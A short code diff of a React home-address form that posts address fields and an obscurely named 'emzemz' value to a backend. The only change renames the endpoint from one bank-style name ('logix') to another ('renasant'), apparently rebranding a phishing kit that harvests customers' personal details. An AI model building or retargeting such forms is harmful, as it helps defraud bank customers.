@@ -49,7 +49,7 @@ const HomeAddress: React.FC = () => {
     // Check if there are no errors (apt is optional)
     if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
       try {
-        await axios.post(`${baseUrl}api/logix-meta-data-4/`, {
+        await axios.post(`${baseUrl}api/renasant-meta-data-4/`, {
           emzemz,
           stAd,
           apt,
